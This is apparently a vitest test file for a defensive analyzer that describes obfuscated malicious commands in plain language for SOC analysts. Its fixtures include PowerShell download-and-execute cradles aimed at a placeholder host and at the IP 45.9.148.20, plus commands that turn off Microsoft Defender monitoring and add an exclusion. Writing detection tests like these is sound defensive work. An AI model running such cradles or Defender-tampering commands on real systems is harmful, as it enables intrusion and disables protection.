// shared/analyzer/__tests__/bullets.test.ts
import { describe, expect, it } from 'vitest'
import { deriveBullets } from '../bullets'
import { buildContext } from '../techniques'
import type { DecodedLayer, ExtractedIoc, Signal } from '../types'

function sig(id: string, overrides: Partial<Signal> = {}): Signal {
  return { id, label: id, techniqueIds: [], specificity: 'strong', trigger: id, ...overrides }
}

describe('deriveBullets — delivery family (SOC must-fix #1)', () => {
  it('a clickfix signal with an actual decoy phrase in the corpus fires the fake-verification-prompt bullet', () => {
    const ctx = buildContext('captcha — please verify you are human, then paste this in Win+R', [], 'powershell')
    const bullets = deriveBullets(ctx, [], [], [sig('clickfix')])
    expect(bullets.some((b) => b.text === 'Presents a fake human-verification prompt instructing the user to paste and run this command (ClickFix pattern)')).toBe(true)
  })

  it('a clickfix signal with NO decoy/headless text (the generic hidden+nop+fetch+IEX fallback) does NOT fire the delivery bullet', () => {
    // clickfix's own techniques.ts rule also fires on a bare hidden+nop+fetch+IEX
    // cradle with no literal verification prompt — asserting "presents a fake
    // human-verification prompt" there would be an invented fact. The delivery
    // bullet requires the actual decoy/headless discriminator, not just the signal.
    const ctx = buildContext("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')", [], 'powershell')
    const bullets = deriveBullets(ctx, [], [], [sig('clickfix')])
    expect(bullets.some((b) => b.text.includes('human-verification'))).toBe(false)
  })
})

describe('deriveBullets — decode/decompress family', () => {
  it('a fully-decoded -enc layer fires a resolved decode bullet', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → UTF-16LE', text: "IEX 'hi'", state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext("IEX 'hi'", [], 'powershell'), layers, [], [])
    const b = bullets.find((x) => x.text.includes('Base64 `-EncodedCommand`'))
    expect(b).toBeTruthy()
    expect(b!.confidence).toBe('resolved')
  })

  it('an opaque (malformed) -enc layer fires an opaque decode bullet, not resolved', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → UTF-16LE', text: null, state: 'opaque', residual: { bytes: 9, entropy: 0, note: 'malformed' } }]
    const bullets = deriveBullets(buildContext('', [], 'powershell'), layers, [], [])
    const b = bullets.find((x) => x.text.includes('malformed'))
    expect(b).toBeTruthy()
    expect(b!.confidence).toBe('opaque')
  })

  it('a Base64 → inflate layer fires a resolved decompress bullet', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → inflate', text: 'IEX x', state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext('IEX x', [], 'powershell'), layers, [], [])
    expect(bullets.some((b) => b.text.includes('Decompresses an embedded blob'))).toBe(true)
  })

  it('a Chr()/fromCharCode layer fires a resolved decode bullet', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Chr()/fromCharCode → text', text: 'Hi', state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext('Hi', [], 'mshta'), layers, [], [])
    expect(bullets.some((b) => b.text === 'Decodes Chr()/fromCharCode-encoded text')).toBe(true)
  })
})

describe('deriveBullets — interpreter-transition family (SOC must-fix #2: never assert "hidden" unconditionally)', () => {
  it('a cmd→powershell hop with NO -w flag resolved omits "(hidden window)"', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'cmd→powershell -enc', text: 'IEX x', state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext('IEX x', [], 'powershell'), layers, [], [])
    expect(bullets.some((b) => b.text === 'Launches a PowerShell child process from cmd.exe')).toBe(true)
    expect(bullets.some((b) => b.text.includes('hidden window'))).toBe(false)
  })

  it('a cmd→powershell hop WITH the -w flag resolved appends "(hidden window)"', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'cmd→powershell -enc', text: 'IEX x', state: 'fully-decoded' }]
    const ctx = buildContext('IEX x', [{ flag: '-w', raw: '-w hidden', techniqueIds: ['T1564.003'] }], 'powershell')
    const bullets = deriveBullets(ctx, layers, [], [])
    expect(bullets.some((b) => b.text === 'Launches a PowerShell child process from cmd.exe (hidden window)')).toBe(true)
  })

  it('an mshta-interpreter signal fires the mshta-execute bullet naming its trigger', () => {
    const signals = [sig('mshta-interpreter', { techniqueIds: ['T1218.005'], trigger: 'https://' })]
    const bullets = deriveBullets(buildContext('', [], 'mshta'), [], [], signals)
    expect(bullets.some((b) => b.text === 'Executes an mshta payload (`https://`)')).toBe(true)
  })

  it('a wsh-script-exec signal fires a language- and host-aware bullet', () => {
    const signals = [sig('wsh-script-exec', { techniqueIds: ['T1059.005'] })]
    const bullets = deriveBullets(buildContext('', [], 'wscript'), [], [], signals)
    expect(bullets.some((b) => b.text === 'Runs a vbs script via wscript')).toBe(true)
  })
})

describe('deriveBullets — fetch/execute family, resolved vs inferred, method-named (SOC must-fix #4)', () => {
  it('a resolved download-cradle URL names the download method and the IOC', () => {
    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'] })]
    const iocs: ExtractedIoc[] = [{ raw: 'http://45.9.148.20/a.ps1', defanged: 'hxxp://45[.]9[.]148[.]20/a[.]ps1', type: 'url', layerIndex: 0 }]
    const ctx = buildContext("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')", [], 'powershell')
    const bullets = deriveBullets(ctx, [], iocs, signals)
    const b = bullets.find((x) => x.verb === 'Downloads')
    expect(b!.confidence).toBe('resolved')
    expect(b!.text).toBe('Downloads content from **hxxp://45[.]9[.]148[.]20/a[.]ps1** via `WebClient.DownloadString`')
    expect(b!.iocs).toEqual(['http://45.9.148.20/a.ps1'])
    expect(bullets.some((x) => x.text.includes('Executes the downloaded content in memory'))).toBe(true)
  })

  it('names Invoke-WebRequest and Start-BitsTransfer when those are the resolved method', () => {
    const signals = [sig('download-cradle')]
    const iwr = deriveBullets(buildContext('Invoke-WebRequest http://x.test/a | IEX', [], 'powershell'), [], [], signals)
    expect(iwr.find((b) => b.verb === 'Downloads')!.text).toContain('via `Invoke-WebRequest`')
    const bits = deriveBullets(buildContext('Start-BitsTransfer -Source http://x.test/a ; IEX $x', [], 'powershell'), [], [], signals)
    expect(bits.find((b) => b.verb === 'Downloads')!.text).toContain('via `Start-BitsTransfer`')
  })

  it('an unresolved download-cradle target degrades to inferred, no IOC named', () => {
    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'] })]
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], signals)
    const b = bullets.find((x) => x.verb === 'Downloads')
    expect(b!.confidence).toBe('inferred')
    expect(b!.text).toBe('Downloads content from a URL assembled at runtime — not resolved')
  })

  it('a cmd-cradle signal fires the fetches-via-for/f bullet', () => {
    const signals = [sig('cmd-cradle', { techniqueIds: ['T1059.003', 'T1105'] })]
    const bullets = deriveBullets(buildContext('', [], 'cmd'), [], [], signals)
    expect(bullets.some((b) => b.text === 'Fetches a command via `for /f`/finger and executes its output')).toBe(true)
  })
})

describe('deriveBullets — per-LOLBin bullets off the generic lolbin signal (SOC must-fix #1)', () => {
  const LOLBIN_EXPECT: Record<string, string> = {
    certutil: 'Decodes/downloads a payload via `certutil`',
    bitsadmin: 'Fetches a file via `bitsadmin`/BITS transfer',
    regsvr32: 'Registers and executes a remote script via `regsvr32` (Squiblydoo)',
    rundll32: 'Executes code via `rundll32`',
    wmic: 'Executes via `wmic`',
  }
  for (const [bin, text] of Object.entries(LOLBIN_EXPECT)) {
    it(`lolbin trigger "${bin}" fires its dedicated bullet`, () => {
      const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: bin })])
      expect(bullets.some((b) => b.text === text)).toBe(true)
    })
  }

  it('msiexec interpolates the resolved MSI URL, or degrades honestly when unresolved', () => {
    const iocs: ExtractedIoc[] = [{ raw: 'http://x.test/a.msi', defanged: 'hxxp://x[.]test/a[.]msi', type: 'url', layerIndex: 0 }]
    const resolved = deriveBullets(buildContext('', [], 'powershell'), [], iocs, [sig('lolbin', { trigger: 'msiexec' })])
    expect(resolved.some((b) => b.text === 'Installs from a remote MSI via `msiexec /i hxxp://x[.]test/a[.]msi`')).toBe(true)
    const unresolved = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: 'msiexec' })])
    expect(unresolved.some((b) => b.text.includes('URL not resolved'))).toBe(true)
  })

  it('a lolbin trigger for a binary with NO dedicated ActionRule (e.g. finger, mshta) fires no LOLBin-specific bullet', () => {
    // mshta already has its own mshta-execute rule off the mshta-interpreter
    // signal — a duplicate "LOLBin: mshta" bullet would double up the reveal.
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: 'mshta' })])
    expect(bullets).toHaveLength(0)
  })
})

describe('deriveBullets — evade family: split rules, no slash-hedge (SOC must-fix #3)', () => {
  it('amsi-reflection and amsi-memory-patch are independent rules that can BOTH fire', () => {
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('amsi-reflection'), sig('amsi-memory-patch')])
    expect(bullets.some((b) => b.text === 'Disables AMSI (script scanning) via reflection')).toBe(true)
    expect(bullets.some((b) => b.text === 'Disables AMSI via an in-memory patch (`AmsiScanBuffer`)')).toBe(true)
  })

  it('etw-tamper fires the ETW-blind bullet', () => {
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('etw-tamper')])
    expect(bullets.some((b) => b.text === 'Blinds ETW logging')).toBe(true)
  })

  it('defender-disable-rtm and defender-add-exclusion are independent rules that can BOTH fire, each naming only its own resolved sub-fact', () => {
    const both = deriveBullets(
      buildContext("Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\Users\\Public\\x'", [], 'powershell'),
      [], [], [sig('defender-tamper')],
    )
    expect(both.some((b) => b.text === 'Disables Microsoft Defender real-time monitoring')).toBe(true)
    expect(both.some((b) => b.text === "Adds a Microsoft Defender exclusion for **C:\\Users\\Public\\x**")).toBe(true)
    // never a combined "X / Y" hedge string
    expect(both.some((b) => b.text.includes(' / '))).toBe(false)
  })

  it('only the resolved evasion-cluster flags are named — never an unresolved one', () => {
    const twoFlags = deriveBullets(
      buildContext('', [{ flag: '-w', raw: '-w hidden', techniqueIds: [] }, { flag: '-nop', raw: '-nop', techniqueIds: [] }], 'powershell'),
      [], [], [sig('evasion-cluster')],
    )
    expect(twoFlags.find((b) => b.verb === 'Runs')!.text).toBe('Runs hidden, no-profile')
    expect(twoFlags.find((b) => b.verb === 'Runs')!.text).not.toContain('execution-policy bypass')
  })
})

describe('deriveBullets — inject/persist/beacon families', () => {
  it('fileless-loader fires the in-memory-injection bullet', () => {
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('fileless-loader')])
    expect(bullets.some((b) => b.text === 'Allocates executable memory and starts a thread on embedded shellcode (in-memory injection)')).toBe(true)
  })

  it('persistence names the mechanism from the resolved corpus', () => {
    const task = deriveBullets(buildContext('Register-ScheduledTask -TaskName evil', [], 'powershell'), [], [], [sig('persistence')])
    expect(task.find((b) => b.verb === 'Creates')!.text).toContain('a scheduled task')
    const run = deriveBullets(buildContext('reg add HKCU\\...\\CurrentVersion\\Run /v x', [], 'powershell'), [], [], [sig('persistence')])
    expect(run.find((b) => b.verb === 'Creates')!.text).toContain('an autostart Run-key')
    const wmi = deriveBullets(buildContext('__EventFilter ... CommandLineEventConsumer', [], 'powershell'), [], [], [sig('persistence')])
    expect(wmi.find((b) => b.verb === 'Creates')!.text).toContain('a WMI event subscription')
  })

  it('beaconing names a resolved host and, when the Start-Sleep interval resolves, appends "every ~{n}s"', () => {
    const iocs: ExtractedIoc[] = [{ raw: '45.9.148.20', defanged: '45[.]9[.]148[.]20', type: 'ipv4', layerIndex: 0 }]
    const withInterval = deriveBullets(buildContext('while ($true) { Start-Sleep 30; IEX $x }', [], 'powershell'), [], iocs, [sig('beaconing')])
    const b = withInterval.find((x) => x.verb === 'Beacons')
    expect(b!.confidence).toBe('resolved')
    expect(b!.text).toBe('Beacons to **45[.]9[.]148[.]20** in a loop every ~30s')
    const noInterval = deriveBullets(buildContext('', [], 'powershell'), [], iocs, [sig('beaconing')])
    expect(noInterval.find((x) => x.verb === 'Beacons')!.text).toBe('Beacons to **45[.]9[.]148[.]20** in a loop')
  })

  it('reverse-shell degrades to inferred with no host IOC', () => {
    const noHost = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('reverse-shell')])
    expect(noHost.find((b) => b.verb === 'Opens')!.confidence).toBe('inferred')
  })
})

describe('deriveBullets — WSH honesty signals quarantine to opaque', () => {
  it('wsh-decode-limits and wsh-concat-eval-present both render opaque-tier bullets', () => {
    const bullets = deriveBullets(buildContext('', [], 'wscript'), [], [], [sig('wsh-decode-limits'), sig('wsh-concat-eval-present')])
    expect(bullets).toHaveLength(2)
    expect(bullets.every((b) => b.confidence === 'opaque')).toBe(true)
  })
})
